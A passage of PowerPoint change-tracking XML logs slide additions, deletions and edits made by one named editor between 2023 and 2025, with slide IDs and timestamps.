      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2651142029" sldId="530"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1586964704" sldId="531"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="809245518" sldId="532"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{B0A063F1-3D88-40BA-AC46-0E959B4B82A3}" dt="2025-03-20T14:23:58.999" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3988245638" sldId="533"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld sldOrd">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-03T19:03:09.338" v="2420" actId="1076"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-19T18:09:33.610" v="12" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3307480244" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-26T18:21:39.715" v="107" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1083683955" sldId="412"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-26T08:51:57.605" v="42" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2764355645" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-26T08:35:44.209" v="31" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="776674572" sldId="440"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-26T08:26:57.560" v="20" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2458016184" sldId="452"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-02T09:03:06.939" v="2260" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041387428" sldId="456"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-03T19:02:07.427" v="2357" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2931003349" sldId="457"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-03T19:02:12.079" v="2359" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="668223248" sldId="458"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-20T17:57:52.242" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2090144454" sldId="460"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod setBg">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T08:46:46.353" v="190" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2469029640" sldId="463"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T08:43:51.313" v="142" actId="15"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3236135027" sldId="464"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod ord">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T09:12:23.626" v="863" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3722655817" sldId="465"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T08:59:50.799" v="612" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2022026658" sldId="466"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T09:20:20.906" v="1294" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2135918341" sldId="467"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T09:21:18.534" v="1372" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1205810816" sldId="468"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T11:06:55.111" v="1667" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3222348994" sldId="469"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T11:31:17.294" v="1952" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2639562663" sldId="470"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T11:19:28.815" v="1684" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3137595583" sldId="471"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-09-27T11:33:00.849" v="2258" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="118295799" sldId="472"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-03T16:31:34.457" v="2276" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3245292302" sldId="473"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{03C7CFA4-1D6A-4E34-A62C-8211EDCFF5A9}" dt="2023-10-03T19:03:09.338" v="2420" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4243112618" sldId="474"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld sldOrd">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T21:24:56.067" v="4518"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-12T20:25:47.265" v="43" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="492019113" sldId="274"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T04:59:50.407" v="64"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1487464807" sldId="275"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:39.316" v="4" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1661475989" sldId="276"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:24.142" v="1" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1893778504" sldId="283"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:55:28.793" v="7" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1611998026" sldId="284"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:28.681" v="2" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="507864118" sldId="285"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:30.508" v="1240" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1494541756" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:35.523" v="3" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3532836991" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:34.338" v="1241"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3857266141" sldId="286"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T12:02:58.953" v="8" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="151221624" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:30.508" v="1240" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="409168732" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:42.361" v="5" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1217379116" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:34.338" v="1241"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4291680369" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T11:50:47.695" v="6" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1494541756" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T05:02:19.371" v="68"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1521460865" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T05:02:14.883" v="67" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1707375737" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T05:01:56.535" v="65" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3839802053" sldId="416"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T12:07:03.008" v="10" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1078710735" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T05:54:25.367" v="170" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1438217836" sldId="417"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T06:20:05.152" v="705" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="227195369" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T12:07:03.008" v="10" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4161381833" sldId="418"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T06:33:33.361" v="799" actId="12"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3357514590" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T12:07:03.008" v="10" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4041687601" sldId="419"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:44:48.914" v="847" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1016325114" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-09T12:07:03.008" v="10" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1304626465" sldId="420"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:48:17.318" v="863" actId="13926"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="96474683" sldId="421"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:49:26.043" v="868" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2764355645" sldId="422"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:51:49.891" v="933" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1452393040" sldId="423"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:54:17.487" v="1025" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="913374407" sldId="424"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T07:59:00.080" v="1126" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3064632979" sldId="425"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T08:11:42.549" v="1174" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="910669299" sldId="426"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:52:50.390" v="1214" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3278387277" sldId="427"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:53:19.273" v="1227" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3535431228" sldId="428"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:34.338" v="1241"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="984428806" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:54:30.508" v="1240" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1070033722" sldId="429"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T11:53:59.408" v="1239" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="743164043" sldId="430"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T12:47:54.562" v="1273" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3252739445" sldId="431"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-13T12:48:01.976" v="1281" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="47218141" sldId="432"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:32:10.611" v="3253" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2228756506" sldId="433"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{265EDE7E-8960-482E-BE3B-AB9358251C6F}" dt="2023-06-14T05:28:57.881" v="3113" actId="2696"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1181081451" sldId="434"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
